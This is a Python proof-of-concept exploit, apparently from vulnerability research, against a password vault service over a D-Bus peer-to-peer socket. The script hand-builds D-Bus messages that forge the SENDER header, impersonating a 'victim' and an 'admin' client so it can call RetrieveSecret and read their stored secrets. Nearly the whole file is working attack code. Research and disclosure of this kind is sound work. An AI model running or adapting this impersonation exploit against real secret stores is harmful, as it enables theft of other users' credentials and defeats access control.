#!/usr/bin/env python3
"""
PoC 4: SENDER spoofing in D-Bus peer-to-peer mode

Connects to the PasswordVault P2P socket and sends a METHOD_CALL
with a forged SENDER header to impersonate another client.

In P2P mode (no bus daemon), SENDER is fully client-controlled.
"""
import socket
import struct
import os
import sys

SOCKET_PATH = "/run/passwordvault1/vault.sock"

print(f"Current user: uid={os.getuid()}")
print(f"Connecting to P2P socket: {SOCKET_PATH}")
print()

def build_dbus_method_call(sender, member, path, interface, destination=None, body_sig="", body=b""):
    """Build a raw D-Bus METHOD_CALL message with custom SENDER."""
    
    # Header fields
    fields = []
    
    # PATH (code 1, type 'o')
    fields.append(build_header_field(1, b'o', path.encode() + b'\x00'))
    # INTERFACE (code 2, type 's')
    if interface:
        fields.append(build_header_field(2, b's', interface.encode() + b'\x00'))
    # MEMBER (code 3, type 's')
    fields.append(build_header_field(3, b's', member.encode() + b'\x00'))
    # DESTINATION (code 6, type 's')
    if destination:
        fields.append(build_header_field(6, b's', destination.encode() + b'\x00'))
    # SENDER (code 7, type 's') - THIS IS THE FORGED FIELD
    fields.append(build_header_field(7, b's', sender.encode() + b'\x00'))
    # SIGNATURE (code 8, type 'g')
    if body_sig:
        fields.append(build_header_field(8, b'g', bytes([len(body_sig)]) + body_sig.encode() + b'\x00'))
    
    # Combine header fields with alignment
    header_fields_data = b""
    for f in fields:
        # Align to 8-byte boundary
        padding = (8 - len(header_fields_data) % 8) % 8
        header_fields_data += b'\x00' * padding + f
    
    header_fields_len = len(header_fields_data)
    body_len = len(body)
    serial = 1
    
    # Fixed header: endian(1) + type(1) + flags(1) + version(1) + body_len(4) + serial(4) + fields_len(4)
    header = struct.pack('<BBBBI I I',
        ord('l'),  # little-endian
        1,         # METHOD_CALL
        0,         # flags
        1,         # protocol version
        body_len,
        serial,
        header_fields_len
    )
    
    # Pad header+fields to 8-byte boundary
    total_header = header + header_fields_data
    padding = (8 - len(total_header) % 8) % 8
    total_header += b'\x00' * padding
    
    return total_header + body

def build_header_field(code, sig_char, value_data):
    """Build a single header field: code(1) + sig(variant) + value"""
    # field code (BYTE)
    result = struct.pack('B', code)
    # variant signature: length(1) + sig + null
    result += struct.pack('B', 1) + sig_char + b'\x00'
    
    if sig_char in (b's', b'o'):
        # String/object path: align to 4, then length(4) + data
        padding = (4 - len(result) % 4) % 4
        result += b'\x00' * padding
        str_len = len(value_data) - 1  # exclude null terminator for length
        result += struct.pack('<I', str_len) + value_data
    elif sig_char == b'g':
        # Signature: length(1) + data (already includes length byte)
        result += value_data
    
    return result

def do_sasl_auth(sock):
    """Perform minimal D-Bus SASL authentication."""
    # Send null byte (required by D-Bus)
    sock.sendall(b'\x00')
    # Send AUTH EXTERNAL with our UID
    uid_hex = str(os.getuid()).encode().hex()
    sock.sendall(f"AUTH EXTERNAL {uid_hex}\r\n".encode())
    
    resp = sock.recv(4096)
    print(f"  Auth response: {resp.decode(errors='replace').strip()}")
    
    if b"OK" in resp:
        sock.sendall(b"BEGIN\r\n")
        return True
    return False

# ---- Test 1: Normal call (with real sender identity) ----
print("=" * 60)
print("Test 1: Normal call (SENDER=:1.999 - our real identity)")
print("=" * 60)

sock1 = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock1.connect(SOCKET_PATH)
sock1.settimeout(3)

if do_sasl_auth(sock1):
    msg1 = build_dbus_method_call(
        sender=":1.999",  # Our "real" identity
        member="RetrieveSecret",
        path="/com/example/PasswordVault1",
        interface="com.example.PasswordVault1.Secrets",
    )
    sock1.sendall(msg1)
    try:
        resp = sock1.recv(4096)
        print(f"  Response: {resp.decode(errors='replace')}")
    except socket.timeout:
        print("  (timeout - no data)")
sock1.close()

print()

# ---- Test 2: Forged SENDER (impersonating victim :1.42) ----
print("=" * 60)
print("Test 2: FORGED SENDER=:1.42 (impersonating victim)")
print("=" * 60)

sock2 = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock2.connect(SOCKET_PATH)
sock2.settimeout(3)

if do_sasl_auth(sock2):
    msg2 = build_dbus_method_call(
        sender=":1.42",  # FORGED - victim's identity!
        member="RetrieveSecret",
        path="/com/example/PasswordVault1",
        interface="com.example.PasswordVault1.Secrets",
    )
    sock2.sendall(msg2)
    try:
        resp = sock2.recv(4096)
        print(f"  Response: {resp.decode(errors='replace')}")
    except socket.timeout:
        print("  (timeout - no data)")
sock2.close()

print()

# ---- Test 3: Forged SENDER (impersonating admin :1.100) ----
print("=" * 60)
print("Test 3: FORGED SENDER=:1.100 (impersonating admin)")
print("=" * 60)

sock3 = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock3.connect(SOCKET_PATH)
sock3.settimeout(3)

if do_sasl_auth(sock3):
    msg3 = build_dbus_method_call(
        sender=":1.100",  # FORGED - admin's identity!
        member="RetrieveSecret",
        path="/com/example/PasswordVault1",
        interface="com.example.PasswordVault1.Secrets",
    )
    sock3.sendall(msg3)
    try:
        resp = sock3.recv(4096)
        print(f"  Response: {resp.decode(errors='replace')}")
    except socket.timeout:
        print("  (timeout - no data)")
sock3.close()

print()
print("=" * 60)
print("Conclusion: In P2P mode, SENDER is fully client-controlled.")
print("The server trusts SENDER for identity, allowing impersonation.")
print("=" * 60)
